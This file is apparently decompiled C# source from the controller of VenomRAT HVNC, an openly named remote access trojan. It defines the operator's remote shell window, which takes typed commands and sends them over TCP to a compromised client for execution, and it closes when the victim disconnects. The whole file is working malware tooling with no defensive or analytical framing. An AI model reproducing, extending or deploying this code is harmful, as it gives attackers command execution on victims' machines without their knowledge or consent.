using System;
using System.Threading;
using System.Windows.Forms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Forms
{
    // Token: 0x02000089 RID: 137
    public partial class FormShell : Form
    {
        // Token: 0x170000DB RID: 219
        // (get) Token: 0x0600050F RID: 1295 RVA: 0x0003C50D File Offset: 0x0003C50D
        // (set) Token: 0x06000510 RID: 1296 RVA: 0x0003C515 File Offset: 0x0003C515
        public Form1 F { get; set; }

        // Token: 0x170000DC RID: 220
        // (get) Token: 0x06000511 RID: 1297 RVA: 0x0003C51E File Offset: 0x0003C51E
        // (set) Token: 0x06000512 RID: 1298 RVA: 0x0003C526 File Offset: 0x0003C526
        internal Clients Client { get; set; }

        // Token: 0x06000513 RID: 1299 RVA: 0x0003C52F File Offset: 0x0003C52F
        public FormShell()
        {
            this.InitializeComponent();
        }

        // Token: 0x06000514 RID: 1300 RVA: 0x0003C540 File Offset: 0x0003C540
        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (this.Client != null && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.textBox1.Text))
            {
                if (this.textBox1.Text == "cls".ToLower())
                {
                    this.richTextBox1.Clear();
                    this.textBox1.Clear();
                }
                if (this.textBox1.Text == "exit".ToLower())
                {
                    base.Close();
                }
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
                msgPack.ForcePathObject("WriteInput").AsString = this.textBox1.Text;
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                this.textBox1.Clear();
            }
        }

        // Token: 0x06000515 RID: 1301 RVA: 0x0003C62C File Offset: 0x0003C62C
        private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
            msgPack.ForcePathObject("WriteInput").AsString = "exit";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000516 RID: 1302 RVA: 0x0003C688 File Offset: 0x0003C688
        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        // Token: 0x06000517 RID: 1303 RVA: 0x000067A9 File Offset: 0x000067A9
        private void textBox1_TextChanged(object sender, EventArgs e)
        {
        }
    }
}